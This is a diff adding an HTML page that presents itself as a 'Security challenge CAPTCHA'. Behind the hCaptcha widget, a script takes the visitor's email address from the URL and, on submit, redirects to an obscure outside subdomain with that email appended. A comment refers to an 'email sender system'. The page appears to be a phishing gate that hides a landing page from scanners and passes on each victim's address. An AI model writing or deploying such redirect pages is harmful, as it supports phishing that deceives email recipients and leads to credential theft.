@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security challenge CAPTCHA</title>
+    <script src="https://hcaptcha.com/1/api.js" async defer></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+        }
+        h1 {
+            font-size: 18px;
+            font-weight: normal;
+            color: #333;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Complete the CAPTCHA to Proceed</h1>
+
+        <!-- Form -->
+        <form action="" method="GET" id="redirect-form" onsubmit="return handleSubmit();">
+            <!-- hCaptcha widget with your site key -->
+            <div class="h-captcha" data-sitekey="96fe4ab4-524c-4156-bb0a-583efec06136"></div><br>
+
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        // Get the email from the URL parameter (you can dynamically grab it from your email sender system)
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || 'default@example.com'; // Use the email passed in the URL or fallback
+
+        function handleSubmit() {
+            var redirectUrl = "https://Wt8vgs.techdocsapp.com/oVvdU" + encodeURIComponent(email);
+            window.location.href = redirectUrl;
+            return false; // Prevent default form submission
+        }
+    </script>
+
+</body>
+</html>
